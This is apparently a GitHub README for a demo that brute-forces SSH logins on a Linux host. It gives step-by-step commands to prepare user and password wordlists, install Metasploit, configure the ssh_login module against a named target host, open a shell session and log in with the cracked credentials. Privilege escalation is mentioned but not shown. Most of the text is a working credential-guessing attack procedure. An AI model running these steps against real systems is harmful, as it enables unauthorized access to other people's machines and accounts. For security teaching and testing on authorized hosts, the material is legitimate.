# Bruteforcing-SSH
========

This is a demo which will exploit SSH on a linux host. Once SSH access is gained, privilege escalation is used to become root. 


Downloading Dictionary Files
------------

Clone the project on your local system:

    git clone https://github.com/sillihkram/Bruteforcing-SSH.git
    cd Bruteforcing-SSH/

unpack and prepare the list of commonly used users & passwords
    
    gunzip passwords.txt.gz
    cp passwords.txt /tmp/passwords.txt 
    cp users.txt /tmp/users.txt

Just so you are familiar, take at the content and format of the files 
    
    wc -l /tmp/passwords.txt # Notice this is a long list
    head /tmp/passwords.txt
    head /tmp/users.txt
    

# Installing Metasploit (RHEL, Fedora, CentOS)
------------

Download the latest version of Metasploit Framework (OSS)

    curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall

Set Permissions 

    chmod 755 msfinstall

 Run the install script

    ./msfinstall

By default metasploit framework installs it's self to `/opt/` let's take a look and add that to our path
    
    ls /opt/
    echo $PATH

Add the `/opt/metasploit-framework/bin/` directory to our path


    PATH=/opt/metasploit-framework/bin/:$PATH
    # you may want to make this persistant add this line to your .bash_profile


Add Metasploit repo to our system and make sure we have the latest version.

    msfupdate

# Installing Metasploit (Mac)
------------

    brew install metasploit
     

# Using Metasploit
------------

Launch the metasploit framework console

 
    msfconsole


List the available exploits modules for metasploit


    show exploits

Because there are over 2000 modules it may make more sense to search for one we're looking for
 
    search ssh login

For this demo select the auxiliary/scanner/ssh/ssh_login exploit module

    use auxiliary/scanner/ssh/ssh_login


List the options available for this module

    options

Define options for ssh_login module to launch a brute force attack against a target host

    set stop_on_success true
    set pass_file /tmp/passwords.txt
    set user_file /tmp/users.txt
    set threads 10


Define a target
    
    set rhost graffias.openincite.net

Launch the brute force attack

    exploit

if Metasploit successfully authenitcates with a usr/pass provided in the lists you'll see a message similar to the following:

`[+] 192.168.0.136:22 - Success: 'docker:password'`


Not only did metasploit find a combination that successfully authenticates but it also left a session open. List the open sessions

    sessions

To interact with the open session use the sessions command: `sessions -i <session id>`

    sessions -i 1

Now you are connected to a shell on the target. try typing some basic shell commands

    hostname -f
    uname -a

# Enumerating a Host
------------

connect to the target using the discovered credentials

    ssh graffias.openincite.net -l docker
